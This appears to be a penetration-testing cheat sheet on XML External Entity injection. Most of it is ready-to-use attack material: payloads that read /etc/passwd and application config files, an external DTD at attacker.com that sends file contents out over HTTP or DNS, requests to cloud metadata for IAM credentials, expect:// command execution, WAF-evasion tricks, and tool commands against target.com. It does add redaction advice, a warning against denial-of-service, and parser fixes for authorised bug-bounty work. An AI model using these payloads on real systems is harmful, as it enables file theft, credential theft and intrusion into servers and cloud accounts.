# XML External Entity Injection (XXE)

> One-line summary: XML parsers that resolve external entities let you read server files, SSRF into internal networks and cloud metadata, and sometimes hit RCE — classic critical-severity finding on SOAP, SAML, and file-import surfaces.

## Overview

XXE occurs when an XML parser processes a document with external entities enabled (the default in many legacy configurations). An attacker supplies a `DOCTYPE` declaring an entity with a `SYSTEM` identifier pointing at a file (`file:///etc/passwd`), an internal URL (`http://169.254.169.254/...`), or their own server (for OOB exfiltration when the response never shows the entity value). The flaw is misconfiguration, not app logic — so one vulnerable parser (SOAP endpoint, SAML consumer, RSS/sitemap importer, SVG thumbnailer, DOCX/XLSX import) exposes everything that parser's process can reach. Impact: arbitrary file read, SSRF (internal services, cloud IAM credentials), DoS, and RCE in niche cases (`expect://`, PHP filter + deserialization chains).

## Where to find it

- SOAP/WSDL endpoints (`?wsdl`, `SOAPAction` APIs) and any `Content-Type: application/xml` / `text/xml` endpoint
- SAML: `/SAML/SSO`, AssertionConsumerService — SAML responses are attacker-controlled when you hold a valid session (rarely fully unauthenticated)
- File imports/exports: DOCX, XLSX, PPTX, ODT, SVG, RSS/Atom feeds, sitemaps, GPX/KML uploads, SVG avatars/favicons
- PDF/XFA forms, "XML export/import" settings features, configuration backup uploads
- API endpoints that accept JSON but also parse XML (try switching `Content-Type`; many frameworks auto-detect)
- SSO/SAML metadata parsing, OpenID/SAML discovery endpoints
- Anything taking a URL that then fetches + parses XML: webhook testers, "import from URL", podcast/RSS integrations
- Editors: WYSIWYG/Html editors that parse SVG; chart libraries (SVG generation) server-side
- Java-specific: REST endpoints using JAXB/JAX-WS, Spring `MappingJackson2Xml`, Struts, XML-based config upload

## Methodology

1. **Find XML entry points** — grep your recon data for `application/xml`, `text/xml`, `.wsdl`, `SOAPAction`, `/saml`, `.docx`/`.xlsx` upload, `svg` upload. Then brute the obvious: POST JSON endpoints with an XML body — if the response says "malformed XML" you just found a parser.
2. **Switch Content-Type and re-send** — take a valid JSON request, send the XML equivalent with `Content-Type: application/xml`. Frameworks with XML message converters (Jackson/Spring, JAXB, Rails) parse it silently.
3. **Test whether entities resolve — the DTD reflection test** — define an internal (non-external) entity and use it in a field that appears in the response:
   ```xml
   <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test "xxe_marker_1337">]><foo>&test;</foo>
   ```
   Response containing `xxe_marker_1337` → internal entities work; now escalate to `SYSTEM` entities.
4. **Classic file read** — `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and reference `&xxe;`. Linux probe files: `/etc/passwd`, `/etc/hostname`, `/proc/self/cmdline`; Windows: `C:\Windows\win.ini`, `C:\boot.ini` (older). In Java, also try `netdoc:///etc/passwd` when `file://` is blocked.
5. **When output isn't reflected (blind) — go OOB** — host an external DTD on your server (or use interactsh's ability to serve? no — interactsh is a listener; for DTD hosting use your own VPS/`python3 -m http.server` + a public IP or a Burp Collaborator? Collaborator can't host DTDs; use a VPS or ngrok + local HTTP server). Put `%xxe;` in the DOCTYPE, and exfiltrate via a parameter entity. See payloads.
6. **Error-based fallback** — if outbound HTTP is blocked but the app returns parser errors, use the "file:///nonexistent/%file;" trick: the parser error message embeds the file content.
7. **Confirm impact without damage** — reading `/etc/hostname` or `/etc/passwd` is the standard proof; for SSRF, hit `http://169.254.169.254/latest/meta-data/` (GET only — do not attempt to use discovered IAM credentials, just note they're reachable and redact).
8. **Billion laughs / quadratic blowup** — recognize the payload class (nested entities → memory exhaustion) but do NOT run it on a live target; it's a DoS and will get you banned. Report the parser version + config finding instead if you must mention it.

## Payloads

```xml
<!-- Classic file read (Linux) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

```xml
<!-- Windows -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xxe;</foo>
```

```xml
<!-- PHP: base64-encode the target so the entity stays valid XML (binary/special chars safe) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
<foo>&xxe;</foo>
```

```xml
<!-- Internal entity test / DTD reflection check -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY test "xxe_marker_1337">]>
<foo>&test;</foo>
```

```xml
<!-- Error-based exfil (no OOB channel, errors visible) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>
```

```xml
<!-- OOB exfil: request declares external DTD on YOUR server -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo>test</foo>
```

```xml
<!-- evil.dtd hosted at http://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

```xml
<!-- evil.dtd variant for PHP targets: base64 the file first (survives URL encoding limits) -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

```xml
<!-- SSRF via XXE — internal services and cloud metadata -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<foo>&xxe;</foo>
```

```xml
<!-- XInclude — when you cannot set a DOCTYPE but the parser processes your element -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

```xml
<!-- SVG upload with XXE (avatars, favicons, image imports) -->
<?xml version="1.0" standalone="yes"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">
  <image xlink:href="file:///etc/passwd" height="300" width="300"/>
</svg>
```

```xml
<!-- DOCX/XLSX: inject into word/document.xml (or [Content_Types].xml) and re-zip -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>
```

```bash
# Java parser quirks — when file:// is filtered
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">        # still often blocked in modern JDKs
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/x">   # legacy JDK only
<!ENTITY xxe SYSTEM "expect://id">                  # PHP with expect:// wrapper (rare) → direct RCE
```

```bash
# Send XML byte-exact (curl --data-binary so nothing gets mangled)
curl -s https://target.com/api/xml \
  -H 'Content-Type: application/xml' \
  --data-binary @xxe.xml

# SOAP wrapper version (SOAP 1.1)
curl -s https://target.com/soap \
  -H 'Content-Type: text/xml' -H 'SOAPAction: "urn:getUser"' \
  --data-binary @xxe-soap.xml
```

## Bypasses & edge cases

- **Encoding tricks vs WAF** — serve the document as UTF-16 (with BOM) or UTF-7: write the payload, then `iconv -f UTF-8 -t UTF-16BE xxe.xml > xxe-utf16.xml`; WAF string matching on `<!DOCTYPE` fails while the parser decodes it. Also UTF-8 with BOM, and CRLF variants of the DOCTYPE declaration.
- **WAF filters "SYSTEM"/"file:"** — case (`SyStEm`), parameter vs general entities, and non-`file` schemes (`netdoc://`, `php://filter`, `http://` for SSRF instead of file read, `gopher://` in PHP for protocol smuggling to Redis/FastCGI).
- **`&#x25;` percent-encoding** — inside internal-subset DTDs, `%` must be `&#x25;` (or the parser rejects the declaration). Most broken payloads found online fail because of this.
- **Parameter entities only in external subset** — you cannot reference a parameter entity in a general-entity declaration inside the *internal* subset; that's why the two-stage external-DTD trick exists. If the target blocks outbound HTTP for DTDs, fall back to error-based.
- **CDATA / HTML entities in the body** — apps that expect JSON-ish XML require well-formed XML: wrap payload output with `]]>` issues aside, keep `&xxe;` exactly where the app used to see a text node.
- **Content-Type confusion** — some apps only run the XML parser when `Content-Type` is exactly `text/xml`, others `application/xml`; try `application/soap+xml`, `application/xhtml+xml`, `image/svg+xml` for SVG paths.
- **Parser libs and defaults** — most modern libs (defusedxml, lxml with `resolve_entities=False`, Java with `FEATURE_SECURE_PROCESSING`) are safe by default. Filtering the response for "XML parser error" wording tells you which lib is behind (e.g. `javax.xml.stream`, `libxml2`, `Nokogiri`).
- **SVG rendered as image** — file content may not surface in the response; use xlink:href pointing to YOUR server to at least prove OOB fetch, or to the metadata IP for SSRF.
- **Billion laughs / "lol billion"** — nested `&lol1;` entities ×10 levels exhaust memory: **do not send** on a live target (DoS). Note it in reports only as a hardening item.
- **SAML-specific** — SAML XML is usually signed; XXE must be injected before signature validation on fields that are not covered by the signature (e.g. the `RelayState` is separate; the assertion body is signed). Use SAMLRaider (Burp) for structured testing.

## Tools

```bash
# interactsh listener for OOB confirmations
interactsh-client -v
# → gives you a domain like abc123.oast.pro; watch hits while you send payloads

# Host the evil.dtd (must be publicly reachable; VPS or ngrok in front of local server)
mkdir -p /tmp/xxe && cd /tmp/xxe
cat > evil.dtd <<'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-VPS/?d=%file;'>">
%eval;
%exfil;
EOF
python3 -m http.server 80
# In another terminal, watch your web server log for GET /?d=<file contents>
```

```bash
# XXEinjector — automates file read via many injection vectors
git clone https://github.com/enjoiz/XXEinjector
ruby XXEinjector.rb --host=YOUR-VPS --httpport=8000 --file=request.txt --path=/etc/passwd --oob=http --phpfilter
# flags: --oob=http|ftp|gopher, --phpfilter (php://filter base64), --ssl, --split (chunked exfil for long files)
```

```bash
# oxml_xxe — builds OOXML (docx/xlsx) files with XXE injected at the right part
git clone https://github.com/BuffaloWill/oxml_xxe
ruby oxml_xxe.rb --extract dir input.docx payload.docx
# then upload payload.docx to the import feature and watch for the OOB / response leak

# Manual docx injection (no tooling)
mkdir docx && cd docx && unzip ../template.docx
# edit word/document.xml — insert DOCTYPE + entity, reference &xxe; in a <w:t>
zip -r ../payload.docx . -x '.*'
```

```bash
# Nuclei DAST for XML endpoints
nuclei -u "https://target.com/api/xml" -dast -tags xxe
```

## Escalation & chaining

- **XXE → SSRF → cloud metadata** — the highest-payout chain: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">` then request the role name → `.../role-name` returns temporary AWS keys. Prove access, redact values, recommend rotation; do not use them.
- **XXE → internal service access** — enumerate internal hosts/ports via entity URLs (`http://127.0.0.1:8080/actuator/env`, `http://169.254.170.2` ECS, `http://metadata.google.internal/computeMetadata/v1/...`). Combine with Gopher (PHP) to speak to Redis/FastCGI and reach RCE.
- **XXE → file read → secrets** — read app config (`/var/www/app/.env`, `config/database.yml`, `/proc/self/environ`) → DB/API credentials → direct data access outside the app.
- **XXE in SAML → auth bypass** — read files or SSRF while authenticated-low-priv; some SAML XXE bugs combine with signature-wrapping for full ATO.
- **XXE (PHP) → RCE** — `expect://id` when the expect wrapper is installed; or base64-read a PHP file with a known unserialize sink then chain deserialization (rare, but report-ready when found).
- **XXE → DoS awareness** — billion laughs affects availability; report parser + mitigation (`FEATURE_SECURE_PROCESSING`), don't demonstrate.
- **Blind XXE → data exfil via DNS** — when HTTP egress is filtered but DNS resolves: `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">` — watch your DNS log for the filename-shaped subdomain.

## Report notes

- Verbatim XML payload + raw request (`curl --data-binary` or Burp) + the response showing file content (redact most lines: show `/etc/passwd` first line `root:x:0:0:...` only, or `/etc/hostname` full).
- For OOB: the interaction log from interactsh/Burp Collaborator/your web server (timestamp, source IP, full path including the leaked data), plus the exact DTD content you served.
- For error-based: the complete parser error string containing the read data.
- For SSRF: the metadata response snippet with credentials redacted (`AccessKeyId: AKIA...` → `AKIA****`), and a statement of the role/permissions you observed but did not use.
- State the parser/stack if identified (from error text), the file read (name + size), and whether OOB egress worked.
- Impact: "XML parser at `POST /api/import` resolves external entities — unauthenticated read of arbitrary files (verified `/etc/passwd`, `/var/www/app/.env` containing DB creds) and SSRF to the EC2 metadata service (IAM role credentials reachable, not used)."
- Fix: disable DTDs/external entities (`XMLInputFactory.SUPPORT_DTD=false`, `disallow-doctype-decl`, libxml `LIBXML_NONET`), use JSON, allowlist imports, run parsers in a sandbox with no file/network access.

## References

- [PortSwigger — XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
- [PortSwigger — Blind XXE (out-of-band)](https://portswigger.net/web-security/xxe/blind)
- [OWASP — XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [HackTricks — XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [payloadbox — XXE injection payload list](https://github.com/payloadbox/xxe-injection-payload-list)
- [XXEinjector](https://github.com/enjoiz/XXEinjector)
- [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)
